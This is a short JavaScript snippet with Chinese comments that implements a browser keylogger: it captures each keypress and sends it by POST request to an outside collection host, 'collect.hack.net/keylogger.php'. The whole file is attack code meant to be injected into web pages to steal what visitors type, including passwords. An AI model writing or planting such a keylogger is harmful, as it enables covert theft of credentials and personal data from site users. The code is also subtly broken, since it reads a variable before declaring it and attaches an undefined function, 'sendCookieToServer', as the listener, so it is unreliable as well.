/*

*/

// 封装函数，制作图片并发送给服务端
function sendKeyLoggerToServer() {
    const evt = evt || window.event;
    const key = String.fromCharCode(evt.charCode);
    if (key) {
        var http = new XMLHttpRequest();
        var param = encodeURI(key);
        const method = "POST";
        const url = "http://collect.hack.net/keylogger.php";
        http.open(method, url, true);
        const header_type = "Content-type";
        const header_value = "application/x-www-form-urlencoded";
        http.setRequestHeader(header_type, header_value);
        http.send("key=" + param);
    }
}
  
// 将事件监听器附加到“keypress”事件上
document.onkeypress = sendCookieToServer;

